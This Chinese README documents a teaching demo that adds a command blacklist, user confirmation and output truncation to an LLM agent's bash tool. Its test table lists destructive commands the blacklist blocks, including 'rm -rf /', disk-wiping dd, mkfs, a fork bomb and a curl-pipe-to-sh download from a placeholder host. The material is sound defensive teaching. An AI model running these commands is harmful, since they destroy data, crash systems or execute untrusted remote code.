# Demo7 — Agent 的安全边界（三道防线）

> 在 demo1（LLM × 工具 × 循环）基础上给 `execute_bash` 加约束：黑名单 / 用户确认 / 输出截断。
> 前 6 个 demo 都在「加能力」，demo7 转而给能力加「边界」。

## 文档导航

- **[`讲稿.md`](讲稿.md)** — 完整教学讲稿（10 章，含口播 / 代码 / 实战演示）
  1. 问题：Agent 的"手脚"太自由
  2. 三道防线总览
  3. 防线 1：黑名单
  4. 防线 2：用户确认
  5. 防线 3：输出截断
  6. 三道防线在 execute_bash 内的串联
  7. 实战演示
  8. demo7 vs 生产级（Claude Code 等）
  9. 改进方向：pre-check / post-check hook 架构
  10. demo1–7 系列回顾

概念讲解、危险来源分析、生产级对比、改进方向全部在讲稿里。本 README 只讲**怎么跑起来**和**设计速查**。

## 关键文件

| 文件 | 说明 |
|---|---|
| `agent.py` | 单文件实现（6 个 Part：客户端 / 工具 / 安全防线 / 主循环） |
| `讲稿.md` | 教学讲稿 |
| `_test_guards.py` | 三道防线单元测试（不调 LLM，直接测函数） |
| `test_dir/` | 演示用测试目录（启动时自动生成，已 gitignore） |

## 设计方案

### 三道防线

| 防线 | 风险 | 策略 | 成本 |
|---|---|---|---|
| **① 黑名单** | 绝对不让执行的命令 | regex 匹配，命中直接拦 | 最低 |
| **② 用户确认** | 理论上安全但要看一眼 | 打断人，y/n/a | 最高 |
| **③ 输出截断** | 命令输出爆掉上下文 | 超过阈值只取头尾 | 中 |

三道防线串在 `execute_bash` 函数内：

```
LLM 调 execute_bash("...")
    │
    ├── 防线 1：黑名单    ── 命中 → 直接拦截（不进 2）
    ├── 防线 2：用户确认  ── 拒绝 → 跳过执行
    ├── 实际执行
    └── 防线 3：截断输出  ── 超长 → 只取头尾
```

用户确认各工具策略不同：`read_file` 直接放行（只读），`write_file` 项目目录内放行 / 项目外确认（越界永远问，不受 `a` 免确认影响），`execute_bash` 每次都确认。

### 实测结果

**防线 1（黑名单）**

| 命令 | 结果 |
|---|---|
| `rm -rf test_dir` / `rm -rf /` / `rm -fr /tmp` | BLOCKED |
| `dd if=/dev/zero of=/dev/sda` | BLOCKED |
| `mkfs.ext4 /dev/sda1` | BLOCKED |
| `shutdown -h now` / `reboot` / `halt` / `poweroff` | BLOCKED |
| `:(){ :\|:& };:` (fork bomb) | BLOCKED |
| `curl http://x.com/install.sh \| sh` | BLOCKED |
| `ls -la` / `echo hello` / `python -c "print(1+2)"` | PASSED |
| `rm test_dir/a.txt`（不带 `-rf`） | PASSED |

**防线 3（截断）**：`agent.py` 22951 字节 → `read_file` 返回 4045 字符（头 2000 + 尾 2000 + 截断标记）。

### pre-check / post-check hook 架构（改进方向）

demo7 三道防线全部硬编码在 `execute_bash` 内。生产级做法是 hook 架构：

```
LLM 调工具
    │
    ├──→ [pre-check hooks]    ← 多个独立函数，每个检查一项
    │     · blacklist_hook     (黑名单)
    │     · confirm_hook       (用户确认)
    │     · network_policy_hook(网络黑白名单)
    │     · secret_scan_hook   (敏感信息扫描)
    │
    ├──→ 实际执行
    │
    └──→ [post-check hooks]    ← 执行后处理
          · truncate_hook      (截断)
          · redact_hook        (脱敏：密码、内网信息)
          · log_hook           (审计日志)
```

加新检查不改主代码，只写新 hook + 注册；不同环境挂不同 hook 集合。

## 运行

### 安装依赖

```bash
pip install -r requirements.txt
```

依赖清单见 `requirements.txt`（仅 `anthropic` SDK）。

### 配置 API Key

网关、模型、超时已在代码里写死，**只需配置 API Key**：

```python
# agent.py Part 1
API_KEY         = ""                                         # ← 只改这一行
BASE_URL        = "https://open.bigmodel.cn/api/anthropic"   # 智谱 BigModel
MODEL           = "glm-5.2"
API_TIMEOUT_MS  = 3000000                                    # 50 分钟
```

**方式 1：改代码（最简单）**

打开 `agent.py`，把 Part 1 顶部的 `API_KEY = ""` 改成你的 Key。

**方式 2：首次运行交互式提示**

`API_KEY` 为空时直接运行 `python agent.py`，会提示输入（仅本次运行有效，不持久化）。

> 也支持 `ANTHROPIC_API_KEY` 环境变量临时覆盖。

### 启动 Agent

```bash
python agent.py            # 启动（自动准备 test_dir/ 及 4 个测试文件）
```

进入交互模式后输入任意任务。**REPL 命令：**

| 命令 | 作用 |
|---|---|
| `quit` / `exit` / `q` | 退出 |
| `[y/n/a]` | 每次执行命令时确认（y=同意 / n=拒绝 / a=本次会话全部同意） |

### 运行测试

```bash
python _test_guards.py     # 三道防线单元测试（不调 LLM，直接测函数）
```

### 演示建议

```bash
# 演示 1（黑名单+确认）：启动后输入
#   > 请帮我清理 test_dir 目录下的所有文件
#   （观察每次 execute_bash 都问 [y/n/a]，LLM 被拒后会换策略）

# 演示 2（截断）：先把 OUTPUT_TRUNCATE_THRESHOLD 改成 1000，然后
#   > 读 agent.py 文件并总结它的功能
#   （观察 read_file 输出含"内容已截断"标记）

# 演示 3（黑名单直测，不走 LLM）：
python -c "import agent; print(agent.execute_bash('rm -rf /'))"
```
